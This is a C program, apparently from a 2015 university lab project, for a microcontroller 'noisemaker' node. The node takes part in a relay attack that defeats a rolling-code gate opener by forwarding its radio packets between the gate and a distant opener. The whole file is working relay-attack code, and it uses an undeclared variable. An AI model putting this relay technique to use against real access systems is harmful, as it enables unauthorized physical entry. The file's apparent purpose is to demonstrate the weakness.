/*
Joseph Finnegan
Maynooth University
Summer 2015

For use with an ATmega128RFA1 microcontroller
Works with a gate, an attacker, and a noisemaker. The open and gate use a rolling code for  authentication (The gate continuously sends out requests for opening.
The opener sends a num to the gate as a response to prove itself. The gate will accept a certain range of nums. 
Every send, the open increments its num, and every receive the gate changes the lower bound to the num received + 1)
In this way, each password will only be accepted once.

The attack is performed when the opener and gate are geographically seperated. The two attacker nodes are connected with a cable and can communicate over the serial line.
The attacker picks up the open request from the gate, saves it, and indicates to the noisemaker (which is near the opener) to block any possible communication (however unlikely).
The attacker then transmits the open request packet over the serial line to the noisemaker. The noisemaker then broadcasts this packet, and picks up the opener's response. It sends
this response to the attacker, who broadcasts it on click, opening the gate.

The major danger of this attack is that the attackers don't need to know the contents of any of the packets, they just have to replay them.
*/

//
// AVR C library
//
#include <avr/io.h>

//
// Standard C include files
//
#include <stdbool.h>
#include <stdio.h>
#include <stdio.h>
#include "string.h"

//
// Header files for the various required libraries
//
#include "app.h"
#include "simple_os.h"
#include "button.h"
#include "leds.h"
#include "radio.h"
#include "serial.h"
#include "hw_timer.h"

typedef struct Packet {
	uint16_t dst;
	uint16_t src;
	uint16_t num;
	uint16_t ender;
} Packet;

Packet newPkt;
char str[8];
uint16_t gate;

typedef struct Req {
	uint16_t dst;
	uint16_t src;
	uint16_t req;
} Req;

Req request;
static timer timer1;

// Buffer for transmitting radio packets
unsigned char tx_buffer[RADIO_MAX_LEN];
bool tx_buffer_inuse=false; // Check false and set to true before sending a message. Set to false in tx_done

//
// App init function
//
void application_start()
{
	leds_init();
	button_init();
	
	radio_init(NODE_ID, true); //true indicates receives radio message for ALL nodes
	radio_set_power(1);
	radio_start();
	
	serial_init(9600);
	
	timer_init(&timer1, TIMER_MILLISECONDS, 1000, 100);
	timer_start(&timer1);
}

//
// Timer tick handler
//
// The packet received here is from the attacker, and is a copy of the gate's "Open" message.
// The noisemaker has to broadcast this message to get a response from the opener.
void application_timer_tick(timer *t)
{
	for(int i=0;i<8;i++){
		str[i] = 0;
	}
	int ind = 0;
	
	 while(serial_ready()){
		 leds_on(LED_RED);
		 str[ind] = serial_get();
		 if(str[ind] == 'Y'){
			canSend = true;
			break;
		 } 
		 ind++;
	 }
	 
	if(canSend){
		canSend = false;
		
		request.dst = str[0];
		request.src = str[2];
		request.req = str[4];
		gate = request.src;
		
		
		leds_on(LED_ORANGE);
		if(tx_buffer_inuse == false)
		{
			tx_buffer_inuse = true;
				 
			memcpy(&tx_buffer, &request, sizeof(Req));
				 
			radio_send(tx_buffer, sizeof(Req), request.dst);
		}
	}	
	
			 
	 /*while(serial_ready()){
		 str[ind] = serial_get();
		 ind++;
		 
		 uint16_t r = str[4];
		 leds_on(LED_RED);
		 if(r == 1){ //its an open message
			 //Turn it into a packet
			 request.dst = str[0];
			 request.src = str[2];
			 request.req = str[4];
			 gate = request.src;
			 
			 //send on that packet to its destination, and pick up the response
			 leds_on(LED_ORANGE);
			 if(tx_buffer_inuse == false)
			 {
				 tx_buffer_inuse = true;
				 
				 memcpy(&tx_buffer, &request, sizeof(Req));
				 
				 radio_send(tx_buffer, sizeof(Req), request.dst);
			 }
			 break;
		 }
	 } */
}

//
// This function is called whenever a radio message is received
//
// Waiting for a response from the opener. When picked up, send it along to the attacker.
void application_radio_rx_msg(unsigned short dst, unsigned short src, int len, unsigned char *msgdata)
{
	newPkt.dst = msgdata[0];
	newPkt.src = msgdata[2];
	newPkt.num = msgdata[4];
	
	if(newPkt.dst == gate){
		//save the packet, send it on to attacker
		
		leds_on(LED_GREEN);
		unsigned char buf[8];
		sprintf(buf, "%02d%02d%02d%c", newPkt.dst, newPkt.src, newPkt.num, 'Y');
		
		//unsigned char buf[8];
		//newPkt.ender = 27;
		//memcpy(&buf, &newPkt, sizeof(Packet));
		serial_puts(buf);
	}
}

//
// This function is called whenever a radio message has been transmitted
// You need to free up the transmit buffer here
//
void application_radio_tx_done()
{
	tx_buffer_inuse = false;
	
	//empty buffers after data has been sent
	for(int j=0; j<RADIO_MAX_LEN; j++)
	{
		tx_buffer[j] = 0x00;
	}
}

void application_button_pressed()
{
	//not needed
}

void application_button_released()
{
	//not needed
}